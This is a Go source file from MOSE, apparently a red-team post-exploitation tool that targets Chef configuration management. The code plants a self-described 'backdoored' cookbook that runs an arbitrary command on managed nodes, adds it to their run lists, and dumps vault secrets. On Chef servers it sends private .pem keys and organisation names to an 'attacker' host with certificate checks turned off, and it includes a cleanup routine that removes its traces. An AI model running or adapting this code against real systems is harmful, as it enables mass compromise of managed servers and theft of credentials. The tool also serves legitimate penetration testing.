// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"text/template"
	"time"

	"github.com/gobuffalo/packr/v2"
	"github.com/master-of-servers/mose/pkg/chefutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
	utils "github.com/l50/goutils"
)

type Command struct {
	CmdName  string
	Cmd      string
	FileName string
	FilePath string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	cmd              = a.Cmd
	debug            = a.Debug
	localIP          = a.LocalIP
	osTarget         = a.OsTarget
	cookbookName     = a.PayloadName
	uploadFileName   = a.FileName
	serveSSL         = a.SSL
	exfilPort        = a.ExPort
	suppliedFilename string
	keys             []string
	inspect          bool
	suppliedNodes    string
	uploadFilePath   = a.RemoteUploadFilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.StringVar(&suppliedFilename, "f", "", "Path to the file upload to be used with a chef cookbook")
	flag.BoolVar(&inspect, "i", false, "Used to retrieve information about a system.")
	flag.StringVar(&suppliedNodes, "n", "", "Space separated nodes")
}

// runKnifeCmd runs an input knife command
// It will return either an error or the output from running the specified command
func runKnifeCmd(cmd string, err error) ([]string, error) {
	if err != nil {
		return []string{}, err
	}
	cleansed := strings.Join(strings.Fields(cmd), " ")
	output := strings.Fields(cleansed)
	return output, err
}

// setRunLists adds the cookbook specified in cookbookName
// to the run_list for a specified set of nodes
func setRunLists(nodes []string, knifeFile string) {
	for _, node := range nodes {
		_, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "run_list", "add", node, "recipe["+cookbookName+"]"))
		if err != nil {
			log.Printf("ERROR: Unable to add the %v cookbook to the run_list for %s: %v", cookbookName, node, err)
		}
	}
}

// removeCookbookVersions removes the versions from cookbooks
// specified in the cookbooks input parameter and returns them
func removeCookbookVersions(cookbooks []string) []string {
	var output []string
	re := regexp.MustCompile(`^\d+\.\d+\.\d+$`)
	for _, cookbook := range cookbooks {
		matches := re.FindAllStringSubmatch(cookbook, -1)
		if len(matches) == 0 {
			output = append(output, cookbook)
		}
	}
	return output
}

// createMetadata is used to generate the metadata.rb file
// used in a chef workstation container using the metadata.rb template
func createMetadata(absCookbookPath string) bool {
	metadataCommand := Metadata{
		PayloadName: cookbookName,
	}
	box := packr.New("Chef", "../../../templates/chef")

	s, err := box.FindString("metadata.rb.tmpl")

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("metadata").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(filepath.Join(absCookbookPath, "metadata.rb"))

	if err != nil {
		log.Fatalln(err)
	}

	if err = t.Execute(f, metadataCommand); err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()
	return true
}

// createCookbook will create a cookbook using a specified input command
func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
	chefCommand := Command{
		CmdName:  cookbookName,
		Cmd:      cmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}

	box := packr.New("Chef", "../../../templates/chef")

	s, err := box.FindString("chefCookbook.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("chefFileCookbook.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("chefCookbook").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}
	evilCookbook := []string{filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes")}
	if moseutils.CreateFolders(evilCookbook) {
		moseutils.Msg("Successfully created the %s cookbook at %s", cookbookName, filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes"))
	}

	absCookbookPath := filepath.Join(cookbooksLoc, "/", cookbookName)

	f, err := os.Create(filepath.Join(absCookbookPath, "/recipes", "default.rb"))

	if err != nil {
		log.Fatalln(err)
	}

	_, err = moseutils.TrackChanges(cleanupFile, absCookbookPath)
	if err != nil {
		log.Println("Error tracking changes: ", err)
	}

	if err = t.Execute(f, chefCommand); err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	// Logic for copying a file to the files directory
	filesLoc := filepath.Join(cookbooksLoc, cookbookName, "files")
	if uploadFileName != "" {
		if moseutils.CreateFolders([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
			moseutils.Msg("Successfully created files directory at location %s for file %s", filesLoc, uploadFileName)

			// Maybe assume it isn't in current directory?
			moseutils.CpFile(uploadFileName, filepath.Join(filesLoc, filepath.Base(uploadFileName)))
			_, err = moseutils.TrackChanges(cleanupFile, uploadFilePath)

			if err != nil {
				log.Println("Error tracking changes: ", err)
			}

			if err := os.Chmod(filepath.Join(filesLoc, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			moseutils.Msg("Successfully copied and chmod file %s", filepath.Join(filesLoc, filepath.Base(uploadFileName)))
		}
	}

	return createMetadata(absCookbookPath)
}

// locateConfig will identify knife.rb or config.rb files in an input list of files
func locateConfig(chefFiles []string) string {
	for _, file := range chefFiles {
		if strings.Contains(file, "knife.rb") || strings.Contains(file, "config.rb") {
			return file
		}
	}
	return ""
}

// Read config file line-by-line and get the location of any pem files that we need
func extractKeys(config string) []string {
	var chefKeys []string
	re := regexp.MustCompile(`.*key\s+'(.*?)'`)

	// Read file line-by-line
	file, err := os.Open(config)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Find the path to the keys via regex
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		res := re.FindAllStringSubmatch(scanner.Text(), -1)
		if len(res) == 1 {
			chefKeys = append(chefKeys, res[0][1])
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	if len(chefKeys) == 0 {
		log.Fatalln("No keys found, exiting.")
	}
	return chefKeys
}

// newFileUploadRequest creates a new file upload http request with optional extra params
func newFileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
	if err != nil {
		return nil, err
	}
	if _, err = io.Copy(part, file); err != nil {
		log.Fatalln(err)
	}

	for key, val := range params {
		_ = writer.WriteField(key, val)
	}
	err = writer.Close()
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", uri, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req, err
}

func transferJSON(jBytes []byte, endpoint string) {
	proto := "http://"
	if serveSSL {
		proto = "https://"
	}
	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/" + endpoint
	if debug {
		log.Printf("Attacker url: %s\n", attacker)
	}

	req, err := http.NewRequest("POST", attacker, bytes.NewBuffer(jBytes))
	req.Header.Set("Content-Type", "application/json")
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{}
	if serveSSL {
		tr := &http.Transport{
			MaxIdleConns: 10,
			TLSClientConfig: &tls.Config{
				MaxVersion:         tls.VersionTLS11,
				InsecureSkipVerify: true,
			},
		}
		client = &http.Client{Transport: tr}
	}
	for i := 0; i < 5; i++ {
		resp, err := client.Do(req)
		if err != nil {
			if i == 4 {
				log.Fatal("Failure to send any responses, check host for issues")
			}
			log.Printf("Failure to send request. Retrying %d", i+1)
			time.Sleep(3 * time.Second)
			continue
		} else {
			defer resp.Body.Close()
			break
		}
	}
}

func transferKey(key string) {
	proto := "http://"
	if serveSSL {
		proto = "https://"
	}
	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/upload"
	request, err := newFileUploadRequest(attacker, nil, "file", key)
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{}
	if serveSSL {
		tr := &http.Transport{
			MaxIdleConns: 10,
			TLSClientConfig: &tls.Config{
				MaxVersion:         tls.VersionTLS11,
				InsecureSkipVerify: true,
			},
		}
		client = &http.Client{Transport: tr}
	}
	resp, err := client.Do(request)
	if err != nil {
		log.Fatal(err)
	} else {
		body := &bytes.Buffer{}
		_, err := body.ReadFrom(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		resp.Body.Close()
		moseutils.Info("Exfilling %v, please wait...", key)
	}
}

func findSecrets(knifeFile string) {
	vaults, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "list"))
	if err != nil {
		log.Println("Error while getting the vault list: ", err)
	}
	for _, vault := range vaults {
		secrets, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "show", vault))
		if err != nil {
			log.Printf("Error retrieving secrets from %s: %v", vault, err)
		}
		for _, secret := range secrets {
			output, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "show", vault, secret))
			if err != nil {
				log.Printf("Error retrieving %s from the %s vault: %v", secret, vault, err)
			}
			moseutils.Msg(strings.Join(output, " "))
		}
	}
}

func chefWorkstation(knifeFile string, chefDirs []string) {
	moseutils.Info("Knife binary detected, attempting to get existing nodes and cookbooks...")
	nodes, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "list"))
	if inspect {
		log.Printf("BEGIN NODE LIST %v END NODE LIST", nodes)
	}
	if err == nil {
		moseutils.Info("We appear to be on a chef workstation")
		moseutils.Msg("The following nodes were identified: %v", nodes)
		cookbooks, err := runKnifeCmd(utils.RunCommand(knifeFile, "cookbook", "list"))
		if err != nil {
			log.Fatalf("Error while trying to get cookbooks: %s", err)
		}
		cookbooksNoVersions := removeCookbookVersions(cookbooks)
		moseutils.Msg("The following cookbooks were identified: %v", cookbooksNoVersions)
		if inspect {
			log.Printf("Passive mode enabled, exiting.")
			os.Exit(0)
		}
		var agents []string
		if suppliedNodes != "" {
			agents = strings.Fields(suppliedNodes)
		} else {
			agents, err = chefutils.TargetAgents(nodes, osTarget)
			if err != nil {
				log.Fatal("Quitting")
			}
		}
		if agents[0] != "MOSEALL" {
			nodes = agents
			if uploadFileName != "" {
				moseutils.Info("Creating a cookbook to run this file: %s on the following Chef agents: %v, please wait...", uploadFileName, nodes)
			} else {
				moseutils.Info("Creating a cookbook to run this command: %s on the following Chef agents: %v, please wait...", cmd, nodes)
			}
		} else {
			if uploadFileName != "" {
				moseutils.Info("Creating a cookbook to run this file: %s on all Chef agents, please wait...", uploadFileName)
			} else {
				moseutils.Info("Creating a cookbook to run this command: %s on all Chef agents, please wait...", cmd)
			}
		}
		var cookbooksLoc string
		for _, dir := range chefDirs {
			if strings.Contains(dir, ".chef/cookbooks") {
				cookbooksLoc = dir
			}
		}
		createCookbook(cookbooksLoc, cookbookName, cmd)
		fmt.Println("Moving to the recipes dir in order to upload the cookbook.")
		moseutils.Cd(cookbooksLoc)
		moseutils.Info("Uploading the cookbook we've created to the chef server, please wait...")
		_, err = runKnifeCmd(utils.RunCommand(knifeFile, "upload", cookbookName))
		if err != nil {
			log.Fatalf("Error while trying to upload backdoored cookbook: %s using the following command: %v", err, knifeFile+" upload "+cookbookName)
		}
		if agents[0] != "MOSEALL" {
			nodes = agents

			if uploadFileName != "" {
				moseutils.Info("Adding a cookbook to run this file: %s to the run_list for the following Chef agents: %v, please wait...", uploadFileName, nodes)
			} else {
				moseutils.Info("Adding a cookbook that will run this command: %s to the run_list for the following Chef agents: %v, please wait...", cmd, nodes)
			}
		} else {
			if uploadFileName != "" {
				moseutils.Info("Adding a cookbook to run this file: %s to the run_list for all Chef agents, please wait...", uploadFileName)
			} else {
				moseutils.Info("Adding a cookbook that run will run this command: %s to the run_list for all Chef agents, please wait...", cmd)
			}
		}
		setRunLists(nodes, knifeFile)
		moseutils.Info("Attempting to find secrets, please wait...")
		findSecrets(knifeFile)
		moseutils.Msg("MOSE has finished, exiting.")
		os.Exit(0)
	}
}

func chefServer(chefServerFile string, chefFiles []string) {
	moseutils.Msg("Chef Server detected")
	moseutils.Info("Using %v to find organizations, please wait...", chefServerFile)
	organizations, err := utils.RunCommand(chefServerFile, "org-list")
	if err != nil {
		log.Fatalln("ERROR: Unable to get organizations")
	}
	type Org struct {
		Name string
	}
	jBytes, _ := json.Marshal(Org{Name: organizations})
	moseutils.Info("Exfilling organization name %v...", organizations)
	transferJSON(jBytes, "org")
	config := locateConfig(chefFiles)
	// If a config.rb or knife.rb exists, use it to locate the keys
	if config != "" {
		moseutils.Msg("Located config files at %v", config)
		keys = extractKeys(config)
		for _, key := range keys {
			transferKey(key)
		}
	} else {
		for _, file := range chefFiles {
			if strings.HasSuffix(file, ".pem") {
				transferKey(file)
			}
		}
		moseutils.Msg("Finished exfiltrating keys, move to the docker container being spawned on the attacker's system to continue post exploitation operations.")
		os.Exit(0)
	}
}

// cleanupChef removes any cookbooks introduced by MOSE, as well as
// any instances of this cookbook in the run_lists for the agents
func cleanupChef(knifeFile string) {
	_, err := moseutils.TrackChanges(cleanupFile, cleanupFile)

	if err != nil {
		log.Println("Error tracking changes: ", err)
	}

	nodes, _ := runKnifeCmd(utils.RunCommand(knifeFile, "node", "list"))
	for _, node := range nodes {
		moseutils.Info("Removing %s from the run_list on %s", cookbookName, node)
		_, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "run_list", "remove", node, "recipe["+cookbookName+"]"))
		if err != nil {
			moseutils.ErrMsg("Error deleting the %s cookbook from %s", cookbookName, node)
		}
	}
	_, err = runKnifeCmd(utils.RunCommand(knifeFile, "cookbook", "delete", "-y", cookbookName))
	if err != nil {
		log.Printf("Error deleting the %s cookbook from the chef server", cookbookName)
	}

	ans, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
	os.Exit(0)
}

func main() {
	flag.Parse()
	// If we're not root, we probably can't backdoor any of the chef code, so exit
	utils.CheckRoot()

	chefFiles, chefDirs := moseutils.FindFiles([]string{"/etc/chef", "/home", "/root"}, []string{".pem"}, []string{"config.rb", "knife.rb"}, []string{`\/cookbooks$`}, debug)

	if len(chefFiles) == 0 {
		log.Fatalln("Unable to find any chef files, exiting.")
	}
	if len(chefDirs) == 0 {
		moseutils.ErrMsg("Unable to find the cookbooks directory.")
	}
	if suppliedFilename != "" && uploadFileName != "" {
		log.Printf("The suppliedFilename (%s) flag is set, assigning to uploadFilename (%s).", suppliedFilename, uploadFileName)
		uploadFileName = suppliedFilename
	}
	// check if knife binary exists on server
	found, knifeFile := moseutils.FindBin("knife", []string{"/bin", "/home", "/opt", "/root"})

	if found {
		if cleanup {
			cleanupChef(knifeFile)
		}
		chefWorkstation(knifeFile, chefDirs)
	}

	moseutils.Info("Determining if we are on a chef server or an invalid target, please wait...")
	found, chefServerFile := moseutils.FindBin("chef-server-ctl", []string{"/bin", "/home", "/opt", "/root"})
	if found {
		chefServer(chefServerFile, chefFiles)
	}
	moseutils.ErrMsg("We are on an invalid target, exiting...")
	os.Exit(1)
}
